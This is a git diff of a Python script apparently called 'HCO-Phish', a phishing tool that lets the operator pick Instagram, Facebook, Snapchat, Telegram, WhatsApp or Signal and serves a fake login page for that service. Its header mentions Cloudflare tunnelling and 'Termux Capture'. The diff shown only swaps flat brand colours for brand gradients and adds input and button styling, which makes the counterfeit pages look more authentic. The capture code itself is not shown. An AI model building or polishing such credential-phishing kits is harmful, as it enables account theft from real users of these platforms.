@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# HCO-Phish – Single Service Realistic Dashboard with Colorful Branding
+# HCO-Phish – Gradient Realistic Login + Cloudflare + Termux Capture
 
 import os, sys, time, subprocess, threading, webbrowser, shutil, re
 from colorama import Fore, init
@@ -23,13 +23,13 @@ def check_subscription():
 
 # ------------------ Termux Menu ------------------ #
 services=["Instagram","Facebook","Snapchat","Telegram","WhatsApp","Signal"]
-colors={
-    "Instagram":"#405DE6",
-    "Facebook":"#1877f2",
-    "Snapchat":"#fffc00",
-    "Telegram":"#0088cc",
-    "WhatsApp":"#25d366",
-    "Signal":"#3a76f0"
+gradients={
+    "Instagram":"linear-gradient(to right, #833ab4, #fd1d1d, #fcb045)",
+    "Facebook":"linear-gradient(to right, #1877f2, #42b72a)",
+    "Snapchat":"linear-gradient(to right, #fffc00, #ffea00)",
+    "Telegram":"linear-gradient(to right, #0088cc, #00bfff)",
+    "WhatsApp":"linear-gradient(to right, #25d366, #128c7e)",
+    "Signal":"linear-gradient(to right, #3a76f0, #5aa0f2)"
 }
 
 choice=None
@@ -44,7 +44,7 @@ while choice not in [str(i) for i in range(1,len(services)+1)]:
     if choice=="0": sys.exit(Fore.RED+"[!] Exiting...")
 
 selected_service=services[int(choice)-1]
-selected_color=colors[selected_service]
+selected_gradient=gradients[selected_service]
 print(Fore.LIGHTMAGENTA_EX + f"[*] You selected: {selected_service}")
 
 check_subscription()
@@ -60,12 +60,51 @@ dashboard_html=f"""
 <head>
 <title>{selected_service} Login</title>
 <style>
-body{{background:{selected_color};color:white;font-family:Arial;text-align:center;margin:0;padding:0;}}
-header{{background:#0d47a1;color:red;font-size:36px;font-weight:bold;padding:25px;}}
-input{{padding:10px;margin:5px;width:250px;border-radius:5px;border:none;font-size:16px;}}
-select{{padding:10px;margin:5px;width:266px;border-radius:5px;border:none;font-size:16px;background:{selected_color};color:white;}}
-button{{padding:10px;margin:5px;width:266px;border-radius:5px;border:none;font-size:16px;background:{selected_color};color:white;font-weight:bold;cursor:pointer;}}
-button:hover{{opacity:0.9;}}
+body {{
+background: {selected_gradient};
+color:white;
+font-family:Arial;
+text-align:center;
+margin:0;padding:0;
+height:100vh;
+}}
+header {{
+background:#0d47a1;
+color:red;
+font-size:36px;
+font-weight:bold;
+padding:25px;
+}}
+input, select {{
+padding:10px;
+margin:5px;
+width:250px;
+border-radius:5px;
+border:none;
+font-size:16px;
+transition:0.3s;
+}}
+input:focus, select:focus {{
+outline:none;
+box-shadow:0 0 10px #fff;
+}}
+button {{
+padding:10px;
+margin:5px;
+width:266px;
+border-radius:5px;
+border:none;
+font-size:16px;
+background:white;
+color:black;
+font-weight:bold;
+cursor:pointer;
+transition:0.3s;
+}}
+button:hover {{
+box-shadow:0 0 15px #fff;
+opacity:0.9;
+}}
 h1{{margin-top:30px;}}
 </style>
 </head>
